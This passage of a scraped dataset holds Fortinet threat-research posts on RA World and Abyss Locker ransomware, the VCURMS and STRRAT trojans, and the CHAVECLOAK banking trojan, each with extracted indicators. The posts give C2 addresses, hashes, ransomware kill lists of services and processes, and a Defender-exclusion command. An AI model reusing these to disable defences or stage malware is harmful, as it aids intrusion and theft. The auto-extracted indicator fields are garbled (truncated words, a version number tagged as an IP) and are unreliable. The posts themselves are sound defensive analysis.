distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. github[.]com/thomasdev33kgithub[.]com/fefifojsgithub[.]com/wonderreader blamefade.com[.]brthinkforce.com[.]br c7dbb5e9e65a221a5f78328b5a6141dd46a0459b88248e84de345b2a6e52b1d9c6fe9169764301cadccb252fbed218a1a997922f0df31d3e813b4fe2a3e6326dc9a27dbae96afb7d083577d30b2947c8ba9d1a6cb7e10e5f259f0929ef107882 9ef9bbfce214ee10a2e563e56fb6486161c2a623cd91bb5be055f5745edd64794d8eac070b6b95f61055b96fb6567a477dbc335ef163c10514c864d9913d23cb30991c9cac5f4c5c4f382f89055c3b5e9bb373c98ce6a5516d06db3f8a478554 malware analysis,phishing FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/byakugan-malware-behind-a-phishing-attack",
      "scraped_at": "2025-07-20T13:49:00.082150",
      "indicators": {
        "ip_address": [],
        "domain": [
          "rthinkforce",
          "equire",
          "lamefade",
          "hrome",
          "ode"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "7435f11e41735736ea95e0c8a66e15014ee238c3a746c0f5b3d4faf4d05215af"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.4643449419568823
    }
  },
  {
    "id": "Fortinet_14948",
    "source": "Fortinet",
    "title": "Ransomware Roundup – RA World",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the RA World ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data. Severity level:High The RA World ransomware was first submitted to a publicly available file scanning service in early December 2023. The threat actor steals victims' data before deploying and running its ransomware malware for file encryption. The group operates both TOR and non-TOR sites where victims' stolen data has been leaked. The ransomware is also designed to delete Volume Shadow Copies and system backups to inhibit system recovery. Information on the infection vector used by the RA World ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. The RA World ransomware samples were submitted to a publicly available file scanning service from the Netherlands, France, the United Kingdom, the Czech Republic, Poland, Colombia, and Japan. The ransomware's data leak sites list 23 victims at the time of this writing. The listed victims are located in Germany, the UK, the US, Italy, Poland, India, Taiwan, Mexico, France, Thailand, and Korea. The first available RA World sample (SHA2: 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801) performs the following actions: It stops the following services: QBFCService QBIDPService Intuit. QuickBooks. FCS QBCFMonitorService zhudongfangyu stc_raw_agent VeeamTransportSvc VeeamDeploymentService VeeamNFSSvc PDVFSService BackupExecVSSProvider BackupExecAgentAccelerator BackupExecAgentBrowser BackupExecDiveciMediaService BackupExecJobEngine BackupExecManagementService BackupExecRPCService AcronisAgent CASAD2DWebSvc CAARCUpdateSvc It terminates the following processes: synctime.exe agntsvc.exe isqlplussvc.exe xfssvccon.exe mydesktopservice.exe ocautoupds.exe firefox.exe tbirdconfig.exe mydesktopqos.exe dbeng50.exe sqbcoreservice.exe infopath.exe msaccess.exe onenote.exe outlook.exe powerpnt.exe thunderbird.exe winword.exe wordpad.exe notepad.exe The ransomware uses the following commands to delete Volume Shadow Copies: The malware encrypts files on the victims’ machines and adds the following extension to the encrypted files: It then drops the ransom note “Data breach warning.txt,“ which includes the following information: The ransomware excludes the following filetypes from file encryption: It excludes the following files and folders from file encryption: Tor Browser Internet Explorer Opera Software Mozilla Firefox $Recycle. Bin ProgramData autorun.inf bootfont.bin bootsect.bak bootmgr.efi bootmgfw.efi desktop.ini $windows.~ws system volume information iconcache.db ntuser.dat.log Program Files Program Files (x86) $windows.~bt The ransomware uses the following specific mutex: Based on this RA World ransomware sample, the following assumption can be made: For example, another RA World ransomware sample (SHA2: 51da3acc6c7089bd0f1df9d9902e183db0d1342552404c3c1b898b168399b0bc) claims to have been compiled on Aug 24 17:56:57 2022 GMT, however this sample did not appear on the file scanning site until February 2, 2024. Its ransom note lists fewer unpaid victims, indicating that the sample was created after 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801. A minor variant of the RA World ransomware (SHA2: 9479a5dc61284ccc3f063ebb38da9f63400d8b25d8bca8d04b1832f02fac24de) became available at the end of January 2024. This variant performs the identical actions as 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801 except for the following: A few days later, yet another minor RA World ransomware variant (SHA2: 31ac190b45cc32c04c2415761c7f152153e16750516df0ce0761ca28300dd6a4) became available. This variant also performs the identical actions as the previously mentioned RA World ransomware samples except for the following: As mentioned above, the RA World ransomware group operates both TOR and non-TOR sites to publish stolen data. The site includes the following statement, which provides a clue to the group's location: War is death’s feast. I survived, but my friend didn’t. Below is an example of a page created for one of the victims: The RA World ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. RA World Ransomware File IOCs 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801 RA World ransomware 51da3acc6c7089bd0f1df9d9902e183db0d1342552404c3c1b898b168399b0bc 31ac190b45cc32c04c2415761c7f152153e16750516df0ce0761ca28300dd6a4 9479a5dc61284ccc3f063ebb38da9f63400d8b25d8bca8d04b1832f02fac24de Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-ra-world",
      "scraped_at": "2025-07-20T13:49:06.904681",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ootsect",
          "utorun",
          "ootfont",
          "otepad",
          "utlook",
          "qbcoreservice",
          "gntsvc",
          "inword",
          "nenote",
          "ordpad",
          "tuser",
          "ynctime",
          "ydesktopqos",
          "beng50",
          "fssvccon",
          "ootmgr",
          "nfopath",
          "saccess",
          "arning",
          "birdconfig",
          "concache",
          "irefox",
          "esktop",
          "ootmgfw",
          "owerpnt",
          "sqlplussvc",
          "ydesktopservice",
          "hunderbird",
          "cautoupds"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801",
          "51da3acc6c7089bd0f1df9d9902e183db0d1342552404c3c1b898b168399b0bc",
          "9479a5dc61284ccc3f063ebb38da9f63400d8b25d8bca8d04b1832f02fac24de",
          "31ac190b45cc32c04c2415761c7f152153e16750516df0ce0761ca28300dd6a4"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.9890109890109893
    }
  },
  {
    "id": "Fortinet_40294",
    "source": "Fortinet",
    "title": "VCURMS: A Simple and Functional Weapon",
    "text": "FortiGuard Labs Threat Research Affected platforms:All platforms with Java installedImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High Recently, FortiGuard Labs uncovered a phishing campaign that entices users to download a malicious Java downloader with the intention of spreading new VCURMS and STRRAT remote access trojans (RAT). The attackers stored malware on public services like Amazon Web Services (AWS) and GitHub, employing a commercial protector to avoid detection of the malware. The attacker attempts to use email as its command and control throughout the attack campaign. The receiving endpoint utilizes Proton Mail, which offers email services that include privacy protection. Figure 1 shows the attack chain. This blog describes how the malware is delivered and specifically examines the unusual VCURMS RAT that is involved in this campaign. The phishing email shown in Figure 2 is part of this attack campaign. It targets staff members, implying that a payment is underway and encourages them to click a button to verify payment information. Upon clicking the button, a harmful JAR file hosted on AWS is downloaded to the victim's computer. The downloaded files resemble typical phishing attachments with spoofed names intended to lure people into opening them. When you look at the file with a JAR decompiler, many strings are obfuscated and one of the class names “DownloadAndExecuteJarFiles.class” clearly indicates the intention of this program, as shown in Figure 3. The program aims to download two JAR files to the attacker-provided path and executes them. As shown in Figure 4, a class employed by the obfuscator is labeled \"sense loader\" in the debug data. The obfuscator selects the appropriate native loader module from the resources based on the current operating system during the execution process. After a specific date, running the malware causes a notification to appear regarding the expiration of the trial for protected tools as shown in Figure 5. Additionally, the code generated by the obfuscator closely resembles the code produced by a legitimate obfuscation tool known as \"Sense Shield Virbox Protector\" as shown in Figure 6. The rest of the execution flow of the JAR file downloads two additional JAR files and runs them separately. We observed an unusual RAT that communicates with its command and control through email. During the initialization step, the program replicates itself into the Startup folder to ensure that it runs automatically when Windows starts. It then alerts the attacker that the victim is online and establishes a schedule to periodically check the mailbox as shown in Figure 7. The attacker identifies the victim using the computer name and Volume ID. When the malware needs to verify the command provided by the attacker, it first examines whether the subject of the email contains identifying information and then proceeds to check the command within the body of the email. The keylogger and password recovery malware are also hosted on AWS and disguised with a .jpg extension. They are downloaded using a PowerShell command. In addition to installing keyloggers and password recovery malware, the command provides various customizable features such as the ability to execute shell commands and upload and download files as shown in Table 1. get information Retrieve system details such as the operating system version, memory capacity, computer name, volume ID, username, country, and the files in the Desktop and Documents folders. Obtain the command and execute it throughcmd.exe /c;the result is sent back to the attacker via email. Download arecoveryJAR file with a .jpg extension and execute it. start keylogger Download akeyloggerJAR file with a .jpg extension and execute it. get keylogger Attach the keylogger data and send it as an attachment. Compress the file at the specified location and then send it as an attachment. Retrieve the attachment and only allow file extensions that are in .jpg format to be accepted. Look for file names containing keywords specified by the attacker. Table 1: Commands The most downloaded malware in this campaign are obfuscated using the Branchlock obfuscator. Information about this obfuscator is located at the end of the JAR file as shown in Figure 10. TheNarumii/Deobfuscatorplays a crucial role in partially supporting the deobfuscation of a program obfuscated with Branchlock. When the command \"recovery\" is received, the program is downloaded and deployed into the %USERPROFILE%\\AppData\\cookie directory with the name st.jar. The primary purpose of the program is to steal information, particularly system information, popular browsers, and apps. The program gathers account information from apps and collects cookies, autofill data, browsing history, and passwords from browsers. The data collected is stored in the directory located at %USERPROFILE%/<username>. Despite the component similarities to Rude Stealer, a Java-based infostealer, this program adopts the name VCURMS. We also have observed a distinction in the method of transmitting the pilfered data. The attacker follows the same path as the main program and sends the stolen information through the same email address. The downloaded keylogger will ultimately be stored in %USERPROFILE%\\AppData\\cookie\\klog.jar. This file is responsible for recording keystrokes. Additional actions such as sending logs back to the attacker requires the main JAR file \"windows.jar\" to execute the functions. STRRAT is a RAT built using Java, which has a wide range of capabilities, such as serving as a keylogger and extracting credentials from browsers and applications. By the end of 2023, it was discovered that STRRAT utilizes two string obfuscation techniques, namely \"Zelix KlassMaster (ZKM)\" and \"Allatori\" to avoid detection. However, the STRRAT observed in this attack campaign follows the same convoluted process. It uses the Allatori Java obfuscator and includes the Branchlock obfuscator, which makes analysis more difficult. The configuration file still remains in the resource. By decoding it using Base64 and decrypting it with the AES Algorithm using the passphrase \"strigoi,\" we can obtain information about the command and control server and ID “Khonsari.” This comprehensive attack operation deploys several malicious programs simultaneously on a victim’s system. It deploys a well-known STRRAT and a new VCURMS based on Java. Even though the VCURMS RAT primarily handles command and control communication, it also includes a modified version of a Rude Stealer and a keylogger in its second phase to gather sensitive data from the victim's system. We discovered that the threat actor was using multiple obfuscation techniques to avoid detection and attempting to use email for communicating with the command and control server. The malware described in this report are detected and blocked byFortiGuard Antivirusas: Java/Agent. A881!trJava/Agent. X!tr.spyJava/Agent. A249!trJava/Agent.6057!trJava/Agent. E730!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. copier@ferrellengineering[.]comsacriliage@proton[.]me bankofindustry[.]s3[.]us-east-2[.]amazonaws[.]comriseappbucket[.]s3[.]ap-southeast-1[.]amazonaws[.]comofornta[.]ddns[.]netjbfrost[.]livebackinghof[.]ddns[.]net 97e67ac77d80d26af4897acff2a3f6075e0efe7997a67d8194e799006ed5efc98d72ca85103f44742d04ebca02bff65788fe6b9fc6f5a411c707580d42bbd249588d6f6feefa6273c87a3f8a15e2089ee3a063d19e6a472ffc0249298a72392d8aa99504d78e88a40d33a5f923caf7f2ca9578031d004b83688aafdf13b3b59fc0d0dee9b8345da3c6cf3e1c3ce5b5b6e8c9e4002358517df1e3cd04c0f0b3d1 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/vcurms-a-simple-and-functional-weapon",
      "scraped_at": "2025-07-20T13:49:14.724508",
      "indicators": {
        "ip_address": [],
        "domain": [
          "t",
          "ownloadAndExecuteJarFiles",
          "hroughcmd",
          "r",
          "indows",
          "log"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.4156479217603913
    }
  },
  {
    "id": "Fortinet_4056",
    "source": "Fortinet",
    "title": "New Banking Trojan “CHAVECLOAK” Targets Brazil",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Controls victim’s device and collects sensitive informationSeverity Level:High FortiGuard Labs recently uncovered a threat actor employing a malicious PDF file to propagate the banking Trojan CHAVECLOAK. This intricate attack involves the PDF downloading a ZIP file and subsequently utilizing DLL side-loading techniques to execute the final malware. Notably, CHAVECLOAK is specifically designed to target users in Brazil, aiming to steal sensitive information linked to financial activities. Figure 1 shows the detailed flow of this cyber threat. In the South American cyberthreat landscape, banking trojans employ a range of tactics, such as phishing emails, malicious attachments, and browser manipulation. Notable examples include Casbaneiro (Metamorfo/Ponteiro), Guildma, Mekotio, and Grandoreiro. These trojans specialize in illicitly obtaining online banking credentials and personal data, posing a significant threat to users in countries like Brazil and Mexico. The CHAVECLOAK's Command and Control (C2) server telemetry is shown in Figure 2. In this blog, we will elaborate on the details of the malware. The PDF, shown in Figure 3, claims contain documents related to a contract, with instructions written in Portuguese. It lures its victims to click a button so they can read and sign the attached documents. However, a malicious downloader link is discreetly embedded within the stream object, as shown in Figure 4, which reveals the decoded URL. This URL undergoes processing via the free link shortening service “Goo.su,” ultimately leading to a redirect at hxxps://webattach.mail.yandex.net/message_part_real/NotaFiscalEsdeletronicasufactrub66667kujhdfdjrWEWGFG09t5H6854JHGJUUR[.]zip for downloading the ZIP file. Upon decompression, the file yields the MSI file “NotafiscalGFGJKHKHGUURTURTF345.msi.” Following the decompression of the MSI installer, we uncovered multiple TXT files related to settings for different languages, a legitimate execution file, and a malicious DLL named “Lightshot.dll.” Notably, the modified date for this DLL file is more recent than that of all the other files in the installer, further emphasizing its unusual nature. Examining the MSI installer reveals its entire configuration, which is written in Portuguese. It executes the file “Lightshot.exe,” extracting and depositing files at “%AppData%\\Skillbrains\\lightshot\\5.5.0.7,” as shown in Figure 6. The file “Lightshot.exe” then deploys DLL sideloading techniques to activate the execution of the malicious DLL, \"Lightshot.dll.\" This technique lets the legitimate executable load and run the malicious code discreetly, facilitating unauthorized activities like data theft. The actions conducted by “Lightshot.dll” involve covert and harmful operations, including the unauthorized acquisition of sensitive information. DLL sideloading poses a significant security threat by allowing the malware to exploit legitimate processes for nefarious purposes without detection. Initially, the process invokes “GetVolumeInformationW” to gather details about the file system and the associated volume related to the specified root directory. It utilizes the HEX value obtained to generate a log file in “%AppData%[HEX ID]lIG.log.” Following this, it adds a registry value named “Lightshot” to “HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,” ensuring automatic execution of the “Lightshot.exe” program upon user login. Once logging and persistence are completed, it sends an HTTP request to hxxp://64[.]225[.]32[.]24/shn/inspecionando.php. If geo-checking confirms that the victim is in Brazil, it logs data on the server, accessible through the path “clients.php,” as shown in Figure 8. It then periodically monitors the foreground window using the APIs “GetForegroundWindow” and “GetWindowTextW.” Upon identifying a window and confirming its name against a predefined list of bank-related strings, the malware establishes communication with its Command and Control (C&C) server. The malware facilitates various actions to steal a victim's credentials, such as allowing the operator to block the victim's screen, log keystrokes, and display deceptive pop-up windows, as shown in Figure 10. The malware actively monitors the victim's access to specific financial portals, including several banks and Mercado Bitcoin, which encompasses both traditional banking and cryptocurrency platforms. After obtaining the user's entered login data, the malware initiates communication with its Command and Control (C2) server at hxxp://comunidadebet20102[.]hopto[.]org. Depending on the bank associated with the stolen data, it uploads the information to distinct paths: “04/M/” for Mercado Bitcoin. It then transmits a POST request containing essential system details and configures the account information within the “InfoDados” parameter, as seen in Figure 12. Additionally, we acquired an older variant of CHAVECLOAK from the check-in site. Its process differs from the previous one, as the ZIP file contains a Delphi executable file embedding the final payload in the RCData section. It begins by retrieving system information to establish a new folder and stores the payload at “C:\\Program Files (x86)\\Editor-GH-[HEX ID]\\Editor-[HEX ID].exe.” Simultaneously, it creates a log file, establishes persistence, and utilizes the PowerShell command “Add-MpPreference –ExclusionPath” to exclude the path “Editor-GH-[HEX ID]” from Windows Defender scans. Subsequently, it sends a check-in request to hxxp://64[.]225[.]32[.]24/desktop/inspecionando.php. Notably, this variant appears to be an earlier version, indicated by the victims' check-in date starting in 2023. It also actively observes user behavior, captures front window text, and harvests personally identifiable information from specified banking and Bitcoin login pages, including names, passwords, and keystrokes. It then transmits the stolen data to the Command and Control (C2) server at hxxp://mariashow[.]ddns[.]net/dtp/cnx.php. The emergence of the CHAVECLOAK banking Trojan underscores the evolving landscape of cyberthreats targeting the financial sector, specifically focusing on users in Brazil. Utilizing sophisticated techniques, including malicious PDFs, ZIP file downloads, DLL sideloading, and deceptive pop-ups, it joins a cohort of prominent banking trojans that primarily target South America. CHAVECLOAK employs Portuguese language settings, indicating a strategic approach to the region, and actively monitors victims' interactions with financial portals. CHAVECLOAK exemplifies the sophistication of contemporary banking trojans, necessitating continual vigilance and proactive cybersecurity measures to safeguard against evolving threats within the financial landscape of South America. The malware described in this report are detected and blocked byFortiGuard Antivirusas: PDF/Agent.72C4!trW32/Banker. CNX!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeFortinet Certified Fundamentals (FCF)in cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. 64[.]225[.]32[.]24 hxxps://webattach.mail.yandex.net/message_part_real/NotaFiscalEsdeletronicasufactrub66667kujhdfdjrWEWGFG09t5H6854JHGJUUR[.]ziphxxps://goo[.]su/FTD9owO mariashow[.]ddns[.]netcomunidadebet20102[.]hopto[.]org 51512659f639e2b6e492bba8f956689ac08f792057753705bf4b9273472c72c448c9423591ec345fc70f31ba46755b5d225d78049cfb6433a3cb86b4ebb5a0284ab3024e7660892ce6e8ba2c6366193752f9c0b26beedca05c57dcb684703006131d2aa44782c8100c563cd5febf49fcb4d26952d7e6e2ef22f805664686ffff8b39baec4b955e8dfa585d54263fd84fea41a46554621ee46b769a706f6f965c634542fdd6581dd68b88b994bc2291bf41c60375b21620225a927de35b5620f92ca1b23be99b6d46ce1bbd7ed16ea62c900802d8efff1d206bac691342678e55 Cara Lin,trojan FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/banking-trojan-chavecloak-targets-brazil",
      "scraped_at": "2025-07-20T13:49:23.203319",
      "indicators": {
        "ip_address": [
          "5.5.0.7"
        ],
        "domain": [
          "andex",
          "otafiscalGFGJKHKHGUURTURTF345",
          "IG",
          "nx",
          "ightshot",
          "nspecionando",
          "oo",
          "lients",
          "ebattach"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.37906137184115535
    }
  },
  {
    "id": "Fortinet_44381",
    "source": "Fortinet",
    "title": "FortiGuard Labs Outbreak Alerts Annual Report 2023: A Glimpse into the Evolving Threat Landscape",
    "text": "FortiGuard Labs Threat Research In today’s dynamic threat environment, staying informed and proactive is crucial for any organization seeking to protect its networks. The FortiGuard Labs Outbreak Alerts Annual Report 2023 is a comprehensive resource that delves into real-world examples of attacks across diverse verticals, offering valuable insights into the most significant cyberattacks of 2023 and critical information that organizations can use to evaluate their cybersecurity posture. The report also goes beyond mere numbers. It offers: The FortiGuard Labs Outbreak Alerts Annual Report 2023 empowers organizations with the knowledge they need to proactively defend themselves. Organizations can subscribe tooutbreak alertsto: The FortiGuard Labs Outbreak Alerts Annual Report 2023 is a vital resource for anyone wanting to gain a holistic view of cyberthreats. By understanding the various significant threats and translating that information into proactive measures, organizations can better protect themselves from cyberattacks. Downloadthe FortiGuard Labs Outbreak Alerts Annual Report 2023. Stay ahead of the latest threats bysubscribing to outbreak alertsfrom FortiGuard Labs. Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-outbreak-alerts-report-2023",
      "scraped_at": "2025-07-20T13:49:30.390889",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.17647058823529416
    }
  },
  {
    "id": "Fortinet_59159",
    "source": "Fortinet",
    "title": "Ransomware Roundup – Abyss Locker",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Abyss Locker (AbyssLocker) ransomware. Affected platforms:Microsoft Windows, LinuxImpacted parties:Microsoft Windows and Linux UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data. Severity level:High Although the first Abyss Locker sample was submitted to a publicly available file scanning service in July of 2023, the first variant of the ransomware may date back further as the ransomware is based on the HelloKitty ransomware source code. A version 1 variant of the Abyss Locker ransomware targeting Windows systems was discovered in early January 2024, followed by version 2 for Windows later that month. (We were unable to locate version 1 for Linux.) We review both the Linux and Windows variants in this week’s roundup. The Abyss Locker threat actor steals victims' data before deploying and running its ransomware malware for file encryption. The ransomware is also capable of deleting Volume Shadow Copies and system backups. Information on the infection vector used by the Abyss Locker ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. The Abyss Locker ransomware samples were submitted to a publicly available file scanning service from a variety of regions, including Europe, North America, South America, and Asia. The Windows version of the Abyss Locker ransomware version 1 performs the following actions: It stops the following services: MSSQLServerADHelper100 MSSQL$ISARS SQLAgent$ISARS SQLAgent$MSFW ReportServer$ISARS MSExchangeADTopology MSExchangeFBA MSExchangeIS MSExchangeSA ShadowProtectSvc SPUserCodeV4 firebirdguardiandefaultinstance QBCFMonitorService QBPOSDBServiceV12 IBM Domino Server (CProgramFilesIBMDominodata) IBM Domino Diagnostics (CProgramFilesIBMDomino) Simply Accounting Database Connection Manager QuickBooksDB1 QuickBooksDB2 QuickBooksDB3 QuickBooksDB4 QuickBooksDB5wrapper QBIDPService Intuit. QuickBooks. FCS zhudongfangyu vmware - usbarbitator64 vmware - converter MSSQL$MICROSOFT##WID MSSQL$VEEAMSQL2012 SQLAgent$VEEAMSQL2012 FishbowlMySQ MSSQL$KAV_CS_ADMIN_KIT SQLAgent$KAV_CS_ADMIN_KIT msftesql - Exchange MSSQL$MICROSOFT##SSEE MSSQL$SBSMONITORING MSSQL$SHAREPOINT MSSQLFDLauncher$SBSMONITORING MSSQLFDLauncher$SHAREPOINT SQLAgent$SBSMONITORING SQLAgent$SHAREPOINT QBFCService PDVFSService BackupExecVSSProvider BackupExecAgentAccelerator BackupExecAgentBrowser BackupExecDiveciMediaService BackupExecJobEngine BackupExecManagementService BackupExecRPCService stc_raw_agent VeeamTransportSvc VeeamDeploymentService VeeamNFSSvc AcronisAgent CASAD2DWebSvc CAARCUpdateSvc WSBExchange MSExchange$ It then terminates the following processes: 360doctor.exe ADExplorer.exe ADExplorer64.exe ADExplorer64a.exe Adobe CEF.exe Adobe Desktop Service.exe AdobeCollabSync.exe AdobeIPCBroker.exe AutodeskDesktopApp.exe Autoruns.exe Autoruns64.exe Autoruns64a.exe Autorunsc.exe Autorunsc64.exe Autorunsc64a.exe AvastUI.exe BrCcUxSys.exe BrCtrlCntr.exe CNTAoSMgr.exe CagService.exe CoreSync.exe Creative Cloud.exe Culture.exe Defwatch.exe DellSystemDetect.exe EnterpriseClient.exe GWCtlSrv.exe GlassWire.exe InputPersonalization.exe MsDtSrvr.exe MsDtsSrvr.exe MsMpEng.exe ONENOTEM.exe PccNTMon.exe ProcessHacker.exe Procexp.exe Procexp64.exe QBDBMgr.exe QBDBMgrN.exe QBIDPService.exe RTVscan.exe Raccine.exe RaccineElevatedCfg.exe RaccineSettings.exe Raccine_x86.exe ReportingServicesService.exe SQLAGENT. EXE Simply. SystemTrayIcon.exe SimplyConnectionManager.exe Sqlservr.exe, Ssms.exe Sysmon64.exe SystemExplorer.exe SystemExplorerService.exe SystemExplorerService64.exe TMBMSRV.exe TeamViewer.exe TeamViewer_Service.exe TitanV, Ssms.exe TmListen.exe TmProxy.exe Totalcmd.exe Totalcmd64.exe VeeamDeploymentSvc.exe WireShark.exe ZhuDongFangYu.exe acwebbrowser.exe agntsvc.exe axlbridge.exe benetns.exe bengien.exe beserver.exe dbeng50.exe dumpcap.exe fbguard.exe fbserver.exe fdlauncher.exe firefox.exe infopath.exe isqlplussvc.exe j0gnjko1.exe msaccess.exe msftesql.exe msmdsrv.exe mydesktopqos.exe mydesktopservice.exe notepad++.exe notepad.exe ntrtscan.exe ocautoupds.exe onenote.exe outlook.exe postgres.exe powerpnt.exe procexp64a.exe proc, procmon64.exe procmon64a.exe qbupdate.exe raw_agent_svc.exe sqbcoreservice.exe sqlbrowser.exe sqlceip.exe sqlmangr.exe sqlservr.exe 